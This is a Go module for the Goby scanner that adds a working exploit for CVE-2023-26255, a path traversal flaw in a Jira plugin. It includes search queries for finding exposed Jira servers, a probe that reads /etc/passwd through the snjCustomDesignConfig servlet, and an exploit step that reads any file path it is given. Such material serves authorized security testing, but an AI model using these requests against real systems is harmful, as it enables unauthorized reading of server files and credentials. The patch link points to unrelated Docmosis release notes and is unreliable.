package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Atlassian Jira snjCustomDesignConfig fileName Arbitrary File Read Vulnerability (CVE-2023-26255)",
    "Description": "<p>Atlassian Jira is a set of defect tracking management system of Atlassian company in Australia. The system is mainly used to track and manage various problems and defects in the work.</p><p>There is a security vulnerability in Jira plugin STAGIL Navigation before 2.0.52. The vulnerability stems from a path traversal vulnerability, which allows attackers to traverse and read the file system.</p>",
    "Product": "ATLASSIAN-JIRA",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2023-02-21",
    "Author": "h1ei1",
    "FofaQuery": "body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" && header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\"",
    "GobyQuery": "body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" && header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in Jira plugin STAGIL Navigation before 2.0.52. The vulnerability stems from a path traversal vulnerability, which allows attackers to traverse and read the file system.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes\">https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes</a></p>",
    "References": [
        "https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26255.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/plugins/servlet/snjCustomDesignConfig?fileName=../../../../etc/passwd&fileMime=$textMime",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/plugins/servlet/snjCustomDesignConfig?fileName={{{filePath}}}&fileMime=$textMime",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-26255"
    ],
    "CNNVD": [
        "CNNVD-202302-2297"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Atlassian Jira 缺陷跟踪管理系统 snjCustomDesignConfig 文件 fileName 参数任意文件读取漏洞（CVE-2023-26255）",
            "Product": "ATLASSIAN-JIRA",
            "Description": "<p>Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。<br></p><p>Jira plugin STAGIL Navigation 2.0.52之前版本存在安全漏洞，该漏洞源于存在路径遍历漏洞，攻击者利用该漏洞可以遍历和读取文件系统。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes\">https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes</a><br></p>",
            "Impact": "<p>Jira plugin STAGIL Navigation 2.0.52之前版本存在安全漏洞，该漏洞源于存在路径遍历漏洞，攻击者利用该漏洞可以遍历和读取文件系统。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Atlassian Jira snjCustomDesignConfig fileName Arbitrary File Read Vulnerability (CVE-2023-26255)",
            "Product": "ATLASSIAN-JIRA",
            "Description": "<p>Atlassian Jira is a set of defect tracking management system of Atlassian company in Australia. The system is mainly used to track and manage various problems and defects in the work.<br></p><p>There is a security vulnerability in Jira plugin STAGIL Navigation before 2.0.52. The vulnerability stems from a path traversal vulnerability, which allows attackers to traverse and read the file system.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes\">https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes</a><br></p>",
            "Impact": "<p>There is a security vulnerability in Jira plugin STAGIL Navigation before 2.0.52. The vulnerability stems from a path traversal vulnerability, which allows attackers to traverse and read the file system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7325"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//https://captainflow.de